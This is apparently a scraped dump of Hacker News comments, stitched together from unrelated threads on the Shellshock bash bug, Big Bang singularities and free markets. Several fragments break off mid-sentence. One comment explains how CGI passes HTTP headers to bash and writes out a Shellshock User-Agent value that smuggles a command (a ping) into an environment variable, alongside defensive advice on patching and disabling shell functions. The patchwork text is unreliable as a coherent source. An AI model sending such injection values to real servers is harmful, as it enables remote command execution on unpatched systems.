It&#x27;s just a flaw with how CGI works generally, and how PHP etc. encourage you to build webapps.<p>It&#x27;s the same principle as SQL-injection attacks (and the flaw is there for the same reason!  It&#x27;s the obvious quick solution to just query mysql with &quot;select * from users where username = &quot; .

The alternative -- that the working of physical theories depends on circumstances -- isn&#x27;t a very good one.<p>People sometimes hypothesize that this universe arose as a fluctuation in some other universe. For this kind of speculation to have any credibility, we have to assume that any singularity can be explained by physical theory, not just present-day singularities.<p>My point is that a theory whose workings depend on the circumstances isn&#x27;t a very powerful one.<p>> We have no evidence that the singularity that existed at the moment of the Big Bang was the result of a collapsing blob of matter.<p>Look at this logically. If there was a singularity at the moment of the Big Bang, then it arose from the same physical theory that creates them in the present, but on a bigger scale. The alternative is to argue that physical theory is inconsistent, depending on circumstances. That sort of condition undermines physical theory, makes it more like a soap opera than science.<p>> In fact, it might not even make sense to think of that initial singularity as the result of anything at all, since causality requires time and there was no time before the Big Bang.<p>Yes, true, but once time exists, then we can start describing phenomena as having causes and effects. So physical theory only applies after time zero, not before. But if, at time zero, there was a singularity, we can try to apply physical theory to it. I&#x27;m not saying we will be successful, but it would be a mistake not to try.",1411660424

Web server (apache) gets request to route to CGI script (PHP)<p>2. Per the CGI spec, apache passes the request body to PHP as stdin & <i>sets the HTTP headers as environment variables</i>, so PHP can access them<p>3. In the PHP script, `exec`/`passthru`/`shell_exec` etc. is called to do something in the shell/on the system level. This spawns a new shell (which may be bash)<p>4. bash <i>interprets the environment variables set by apache</i><p>The rub lies in step 4: when bash interprets an environment variable called `HTTP_USER_AGENT` containing the value `() { :;}; /bin/ping -c 1 198.x.x.x` it &quot;gets confused&quot; & interprets that first part (before the second semicolon) as a function, <i>then executes the second part as well</i><p>Hopefully this answers the &quot;how does the exploit get from the browser to bash?&quot;<p>Further question: &quot;If I do <i>not</i> use exec/shell_exec/popen etc, am I still vulnerable (just by virtue of using mod_php)?&quot;  AFAICT No, but I am not really sure (I hope someone clears this up).<p>Additional note about PHP: disabling all these passthru type functions has been recommended for years: <a href=""http://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/"" rel=""nofollow"">http://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpi...</a>",1411659477

At a minimum, you have to enable a network service like printer sharing (CUPS), remote login (ssh), web sharing (Apache).<p>Then you have to configure the service in such a way to actually be vulnerable, and these are not commonly configured options.<p>The attacker also has to have a local privilege escalation vulnerability to exploit as well, or they&#x27;re trapped as the CUPS user once they do bust in.<p>I don&#x27;t think that the level of panic I have seen on other Hacker News threads and elsewhere on the Internet is warranted. Comparing this to Heartbleed is pretty absurd; TLS vs bash CGI is no contest in terms of deployment size.<p>I&#x27;m mainly concerned with public-facing, large scale web services, and in that area:<p>1. CGI in general and bash CGI in particular are basically unheard of.<p>2. system() in other scripting languages might be used, BUT to be vulnerable you have to pass through user-supplied data as environment variables without sanitizing. This was always an exploit waiting to happen.<p>3. ssh accounts with a command forced in authorized_keys are potentially problematic, but this would only be from users who have some relationship to your service in the first place. Personally I think a restricted shell (rsh or git-shell or whatever) is a more common option, simply because who knows what bash might get up to.<p>4. DHCP client scripts on Linux is an interesting exploit path, and might be a problem for laptops on shared wifi, but for the majority of Linux servers there is no attack vector. They live on controlled networks where rogue DHCP servers can&#x27;t be operated.<p>So yes, patch the vulnerability and audit your systems and code.

Even if free market is often better in practice, that observation is far from allowing for a general declarative statement like yours.<p>> <i>I can&#x27;t understand how people think these programs are a good idea.
